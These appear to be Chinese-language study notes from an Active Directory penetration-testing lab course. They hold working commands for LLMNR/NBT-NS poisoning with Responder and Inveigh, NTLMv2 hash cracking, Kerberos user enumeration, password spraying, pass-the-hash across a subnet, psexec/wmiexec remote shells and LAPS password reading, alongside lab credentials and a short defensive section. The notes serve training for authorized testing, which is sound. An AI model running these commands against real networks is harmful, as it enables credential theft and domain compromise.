工具
工具简介
工具要点
工具url
命令

在主机上获得 SYSTEM 级别访问权限有多种方法，不限于：
远程 Windows 漏洞利用，如 MS08-067、EternalBlue 或 BlueKeep。
滥用在 SYSTEM 帐户 上下文中运行的服务，或使用 Juicy Potato 滥用服务帐户的 SeImpersonate 权限。这类攻击在较旧的 Windows 操作系统上是可能的，但在 Windows Server 2019 上不总是可行。
Windows 操作系统中的本地权限提升 (privilege escalation) 缺陷，如 Windows 10 任务计划程序 0-day 漏洞。
在已加入域的主机上使用本地帐户获得管理员访问权限，并使用 Psexec 启动一个 SYSTEM cmd 窗口。

通过在已加入域的主机上获得 SYSTEM 级别的访问权限，不限于：
使用内置工具或攻击性工具（如 BloodHound 和 PowerView）枚举域。
在同一域内执行 Kerberoasting / ASREPRoasting 攻击。
运行 Inveigh 等工具来收集 Net-NTLMv2 哈希或执行 SMB 中继攻击。
执行令牌模拟以劫持特权域用户帐户。
执行 ACL 攻击。

在进行规避性渗透测试、对抗性评估或红队演练 (red team engagement) 时，你是在试图模仿潜在攻击者的工具、战术和程序（TTPs），隐蔽性 (stealth) 就很重要了

本地链路多播名称解析 (LLMNR) 和 NetBIOS 名称服务 (NBT-NS) 是 Microsoft Windows 的组件，当 DNS 解析失败时，它们可作为主机识别的备用方法
当使用 LLMNR/NBT-NS 进行名称解析时，网络上的任何主机都可以回复。这就是我们使用 Responder 来投毒这些请求的切入点

利用Sysinternals、WMI、DNS 等原生工具和语言来枚举 AD
练习攻击，包括密码喷洒 (Password spraying)、Kerberoasting
使用 Responder、Kerbrute、Bloodhound 等工具


xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!

ssh htb-student@<ATTACK01 target IP>

***GO
https://he.net/
托管了BGP-Toolkit，用于ASN查询
https://bgp.he.net/

https://viewdns.info/
在线单DNS查询

google dork:
filetype:pdf inurl:inlanefreight.com
intext:"@inlanefreight.com" inurl:inlanefreight.com

target website contact page

linkedin2username      
LinkIn to worklist
  https://github.com/initstring/linkedin2username
Dehashed
在泄露数据中搜寻明文凭证和密码哈希
  https://github.com/sm00v/Dehashed
  https://dehashed.com/
sudo python3 dehashed.py -q inlanefreight.local -p

监听内网:
sudo -E wireshark
sudo tcpdump -i ens224
pktmon.exe，已添加到所有版本的 Windows 10 中

保存你捕获的 PCAP 流量总是一个好主意


Responder
用于监听、分析和毒化 LLMNR、NBT-NS 和 MDNS 请求和响应的工具
HASH位于 /usr/share/responder/logs 目录中
以 sudo 权限或 root 身份运行该工具，并确保我们的攻击主机上以下端口可用
Hashcat，使用哈希模式 5600 来处理我们通常用 Responder 获得的 NTLMv2 哈希
  https://github.com/lgandx/Responder-Windows
sudo responder -I ens224 -A
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt


Inveigh
跨平台的 MITM 平台，可用于欺骗和投毒攻击，Windows平台Responder
  https://github.com/Kevin-Robertson/Inveigh
  https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters
C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y      这个PS版本不维护了
C:\htb> .\Inveigh.exe                                                用C#版本
GET NTLMV2UNIQUE 查看捕获到的唯一哈希值
GET NTLMV2USERNAMES 查看收集到的用户名
perl -p -i -e 's/\R//g;' ntlmv2.txt      删除换行
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt


Fping
提供了与标准 ping 应用程序类似的功能，利用 ICMP 请求和回复来联系和与主机交互
  https://fping.org/
fping -asgq 172.16.5.0/23      a显示存活的目标，s结束时打印统计信息，g从 CIDR 网络生成目标列表，q不显示每个目标的结果


Nmap
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
sudo nmap -A -v -Pn 172.16.5.5
sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23
务必使用 -oA 标志


Kerbrute
是域帐户枚举中一个更隐蔽的选项
利用 Kerberos 预身份验证 (pre-authentication) 失败通常不会触发日志或警报
向域控制器发送不带 Kerberos 预身份验证的 TGT 请求以执行用户名枚举
精明的攻击者可能会避开 SMB 密码喷洒，转而攻击 LDAP
结合 Insidetrust 的 jsmith.txt 或 jsmith2.txt 用户列表来使用 Kerbrute
  https://github.com/ropnop/kerbrute
  https://github.com/insidetrust/statistically-likely-usernames
sudo git clone https://github.com/ropnop/kerbrute.git      下载二进制文件
make help      查看编译器帮助
sudo make all  编译所有平台的格式
./kerbrute_linux_amd64      运行
export PATH=/usr/local/bin/kerbrute:$PATH      添加到PAHT
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users.txt      枚举用户名
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users.txt Welcome1      密码喷洒

SMB NULL 会话允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机的完整列表、用户帐户属性以及域密码策略
进行枚举，可以使用 enum4linux、CrackMapExec、rpcclient 等工具


enum4linux 
围绕 Samba 工具套件（如 nmblookup、net、rpcclient 和 smbclient）构建的工具，用于枚举 Windows 主机和域
  https://labs.portcullis.co.uk/tools/enum4linux/
enum4linux -P 172.16.5.5
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > validUsers.txt      枚举用户名


enum4linux-ng
是 enum4linux 的 Python重写版，但增加了额外的功能，例如能够将数据导出为 YAML 或 JSON 文件
  https://github.com/cddmp/enum4linux-ng
enum4linux-ng -P 172.16.5.5 -oA ilfreight


crackmapexec
smb 172.16.5.5 --users      空凭证
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users    带凭证枚举用户
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --groups   带凭证枚举组
--loggedon-users      现登录，看到用户已登录，如果是一名域管理员，从内存中窃取该用户的凭据或冒充他们，这可能是一个轻松的胜利
--shares       枚举上可用的共享
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'      爬取'Department Shares'中的文件，结果写入位于 /tmp/cme_spider_plus/<ip of host> 的 JSON 文件中


SMBMap
获得访问权限，可以用来下载和上传文件，执行远程命令
  https://github.com/ShawnDEvans/smbmap
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5      查权限
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only      列目录


rpcclient
专为 Samba 协议设计，并通过 MS-RPC 提供额外功能，可以枚举、添加、更改甚至从 AD 中删除对象
  https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
rpcclient -U "" -N 172.16.5.5      空会话
rpcclient $> querydominfo
rpcclient $> enumdomusers

Windows 不认用户名（如 "Admin"），只认 SID。重命名用户不影响其 SID，权限依旧生效
RID，类似组ID，对于一个对象是唯一的
rpcclient $> queryuser 0x457      枚举0x457组的用户


Impacket
多功能的工具包，提供了许多不同的方法来使用 Python 枚举、交互和利用 Windows 协议，不限以下工具
  https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
  https://github.com/fortra/impacket/blob/master/examples/psexec.py
psexec.py 是 Sysinternals psexec 的克隆，工作方式略不同，将一个随机命名的可执行文件上传到目标主机的 ADMIN$ 共享来创建一个远程服务 (remote service)，
通过 RPC 和 Windows Service Control Manager 注册该服务，通过一个命名管道 (named pipe) 进行，在受害主机上提供一个以 SYSTEM 身份运行的交互式远程 shell (interactive remote shell)
$psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
Wmiexec.py 利用一个半交互式 shell (semi-interactive shell)，命令通过Windows 管理规范 (Windows Management Instrumentation) 执行,
不会在目标主机上留下任何文件或可执行文件，以连接时使用的本地管理员用户身份运行（这比看到 SYSTEM 执行许多命令要不那么明显）,仍然很可能被大多数现代反病毒 (anti-virus) 和端点检测与响应 (EDR) 系统捕获
$wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  


从 Windows 进行此类 null 会话攻击不太常见
C:\htb> net use \\DC01\ipc$ "" /u:""       建立空对话
C:\htb> net use \\DC01\ipc$ "" /u:guest    测试账号禁用
C:\htb> net use \\DC01\ipc$ "password" /u:guest  测试密码错误 OR 账号锁定
确保域密码锁定策略不会增加拒绝服务 (denial of service) 攻击的风险，至关重要。如果需要管理员手动干预才能解锁帐户，那么一次粗心的密码喷洒可能锁定大量帐户


ldapsearch
ad-ldapdomaindump.py
LDAP 匿名绑定允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机的完整列表、用户帐户属性以及域密码策略
使用 netexec / crackmapexec 提取密码策略更加直接
  https://linux.die.net/man/1/ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "


windapsearch.py
同ldasearch, 通过 LDAP 查询 (LDAP queries) 来枚举 Windows 域中的用户、组和计算机
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U      空会话
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da      带凭证
--da      枚举域管理员组成员
-PU      查找特权用户，会递归搜索具有嵌套组成员身份 (nested group membership) 的用户


Bloodhound.py
对AD创建图形表示或“攻击路径 (attack paths)
  https://github.com/dirkjanm/BloodHound.py


查看密码策略
C:\htb> net accounts
OR
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
创建新域时有默认密码策略，有大量的组织从未更改


防御
组策略 (Group Policy) 禁用 LLMNR，路径为：计算机配置 (Computer Configuration) -> 管理模板 (Administrative Templates) -> 网络 (Network) -> DNS 客户端 (DNS Client)，关闭多播名称解析 (Turn OFF Multicast Name Resolution)
NBT-NS 无法通过组策略禁用，必须在每台主机上本地禁用。打开控制面板 (Control Panel)下的网络和共享中心 (Network and Sharing Center)，更改适配器设置 (Change adapter settings)，右键点击适配器属性，选择Internet 协议版本 4 (TCP/IPv4)，点击属性 (Properties)按钮，点击高级 (Advanced)并选择WINS选项卡，禁用 TCP/IP 上的 NetBIOS (Disable NetBIOS over TCP/IP)
在“计算机配置 (Computer Configuration)” --> “Windows 设置 (Windows Settings)” --> “脚本(启动/关机) (Script (Startup/Shutdown))” --> “启动 (Startup)”下创建一个 PowerShell 脚本
  ——————
  $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
  Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
  ——————
本地组策略编辑器中，双击启动 (Startup)，选择PowerShell 脚本 (PowerShell Scripts)选项卡，并将“对于此 GPO，按以下顺序运行脚本 (For this GPO, run scripts in the following order)”设置为首先运行 Windows PowerShell 脚本 (Run Windows PowerShell scripts first)，点击添加 (Add)并选择该脚本
重启目标系统或网络适配器
要将此策略推送到域中的所有主机，在域控制器 (Domain Controller) 上使用组策略管理 (Group Policy Management)创建一个 GPO，并将脚本托管在 scripts 文件夹下的 SYSVOL 共享中，然后通过其 UNC 路径调用它，例如：
\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
一旦 GPO 应用于特定的组织单位 (OU)，并且这些主机重新启动，该脚本将在下次重启时运行并禁用 NBT-NS，前提是该脚本仍然存在于 SYSVOL 共享上，并且主机可以通过网络访问它

过滤网络流量以阻止 LLMNR/NetBIOS 流量
启用 SMB 签名 (SMB Signing) 以防止 NTLM 中继攻击
网络入侵检测和防御系统
网络分段 (network segmentation) 隔离那些需要启用 LLMNR 或 NetBIOS 才能正常运行的主机


密码喷洒

for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +    找到+的有效喷洒
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123      登录验证

DomainPasswordSpray
已经通过了域的身份验证，工具自动从 Active Directory 生成一个用户列表，查询域密码策略，并排除那些离被锁定只差一次尝试的用户帐户
  https://github.com/dafthack/DomainPasswordSpray
C:\htb> Import-Module .\DomainPasswordSpray.ps1
C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue


如果发现某台桌面主机的本地管理员帐户密码设置为 $desktop%@admin123, 可能尝试对服务器使用 $server%@admin123
如果我们发现非标准的本地管理员帐户 bsmith，可能会发现其密码被用于一个名称相似的域用户帐户
如果获取了名为 ajones 的用户的密码，那么值得在他们的管理员帐户（如果该用户有的话），如 ajones_adm 上尝试相同的密码

从本地 SAM 数据库中检索到本地管理员帐户的 NTLM 哈希, 可以在整个子网（或多个子网）中喷洒该 NT 哈希
噪音很大，对于任何需要隐秘性的评估来说都不好
--local-auth 标志将告诉该工具在每台机器上只尝试登录一次，这消除了任何帐户锁定的风险
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +


防御
多因素认证 (Multi-factor Authentication) 
最小权限原则 (principle of least privilege)
网络分段 (network segmentation)
确保特权用户 (privileged users) 为任何管理活动使用单独的帐户
密码卫生 (Password Hygiene)


检查 Microsoft Defender 状态
C:\htb> Get-MpComputerStatus


AppLocker
微软的应用程序白名单解决方案
系统管理员可以控制用户能够运行哪些应用程序和文件。对可执行文件、脚本、Windows 安装程序文件、DLL、打包的应用以及打包的应用安装程序提供了精细的控制
  https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/what-is-applocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections      查看策略
C:\htb> $ExecutionContext.SessionState.LanguageMode      查看PS约束模式，例如阻止 COM 对象、只允许经批准的 .NET 类型、基于 XAML 的工作流、PowerShell 类等
C:\htb> Find-LAPSDelegatedGroups       查找组，可读取 LAPS 密码
C:\htb> Find-AdmPwdExtendedRights      查找用户，可读取 LAPS 密码
C:\htb> Get-LAPSComputers      搜索启用了 LAPS 的计算机、密码何时过期，如果用户有访问权限，可以获取明文 (cleartext) 形式的随机密码
